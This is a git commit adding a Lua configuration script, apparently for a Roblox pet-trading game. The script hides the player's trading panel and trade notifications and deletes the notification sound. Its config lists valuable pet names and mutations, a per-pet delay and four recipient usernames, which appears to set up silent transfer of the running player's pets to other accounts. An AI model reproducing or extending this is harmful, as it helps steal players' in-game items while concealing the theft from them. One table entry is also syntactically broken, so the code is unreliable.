f20c10eb86336e9f5c1970780786bfb61bca4b2b
unblock-eve <coke@dr.com>
2025-07-23 01:21:56 -0500

    Create AUTOSETTINGS.lua

---
+++ AUTOSETTINGS.lua
@@ -0,0 +1,51 @@
+local Players = game:GetService("Players")
+local SoundService = game:GetService("SoundService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+
+if PlayerGui then
+    local trading = PlayerGui:FindFirstChild("Trading")
+    if trading then
+        trading.Padding.Visible = false
+    end
+
+    local topNotification = PlayerGui:FindFirstChild("Top_Notification")
+    if topNotification then
+        topNotification.Frame.Visible = false
+    end
+end
+
+local notificationSound = SoundService:FindFirstChild("Notification")
+if notificationSound then
+    notificationSound:Destroy()
+end
+
+
+return {
+    ENABLE_AGE_FILTER    = true,
+    ENABLE_WEIGHT_FILTER = true,
+    MIN_AGE              = 60,
+    MIN_WEIGHT           = 25,
+
+    ALLOWED_NAMES = {
+        ["raccoon"]       = true,
+        ["disco bee"]     = true,
+        ["mimic octopus"] = true,
+        ["kitsune"] = true,
+
+    },
+
+    ALLOWED_MUTATIONS = {
+        ["ascended"]  = true,
+        ["rainbow"]
+    },
+
+    DELAY_BETWEEN_PETS = 0.125,
+
+    RECIPIENT_USERNAMES = {
+        ["JobJobJob_JobJobJob"] = true,
+        ["1xxxCoolGuyxx1"]      = true,
+        ["canyoust0pME"]        = true,
+        ["JesusIsMyOneAndOnIy"] = true,
+    },
+}
